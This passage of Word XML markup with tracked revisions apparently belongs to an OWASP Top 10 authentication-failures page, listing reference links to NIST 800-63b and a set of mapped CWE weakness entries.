            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>owasp.org/</w:t>
      </w:r>
      <w:del w:id="2787" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/OWASP_Automated_Threats_</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2788" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-automated-threats-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:del w:id="2789" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>_Web_Applications)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2790" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-web-applications/)a -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="46DAF20D" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2791" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5884AACC" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2792" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2793" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### External</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="74993849" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2794" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D896781" w14:textId="72481C93" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2795" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2796" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [NIST 800-63b: 5.1.1 Memorized </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Secrets](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret) -</w:t>
      </w:r>
      <w:del w:id="2797" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> for thorough, modern, evidence-based advice on authentication. </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0B547B49" w14:textId="537D3554" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2798" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2799" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="430A5492" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2800" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2801" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## List of Mapped CWEs </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">{{ </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>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 ".mapped </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cwes</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>", id=id ~ "-</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>mapped_cwes</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>", name=title ~ ": List of Mapped CWEs", lang=lang, source=source ~ "#" ~ id, parent=</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>) }}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7E5B2F97" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2802" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B3DA9CC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2803" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2804" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-255: Credentials Management </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Errors](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/255.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="57A7A6FD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2805" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2806" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-259: Use of Hard-coded </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Password](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/259.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="55BE145F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2807" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CWE-287: Improper </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Authentication](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/287.html)</w:t>
      </w:r>
      <w:ins w:id="2808" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="78205FE4" w14:textId="0573B029" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2809" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2810" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-384: Session Fixation</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2811" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-288: Authentication Bypass Using an Alternate Path or </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Channel](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/288.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D0BB6CD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2812" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2813" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-290: Authentication Bypass by </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Spoofing](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/290.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="15708B73" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2814" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2815" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-294: Authentication Bypass by Capture-</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>replay](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/294.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="19A27E5E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2816" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2817" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-295: Improper Certificate </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Validation</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/</w:t>
      </w:r>
      <w:ins w:id="2818" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">295.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="09D6897C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2819" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2820" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-297: Improper Validation of Certificate with Host </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Mismatch](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/297.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="06650968" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2821" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2822" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-300: Channel Accessible by Non-</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Endpoint](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/300.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6D268676" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2823" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2824" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-302: Authentication Bypass by Assumed-Immutable </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Data](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/302.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7A015918" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2825" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2826" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-304: Missing Critical Step in </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Authentication](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/304.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="20C3F438" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2827" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
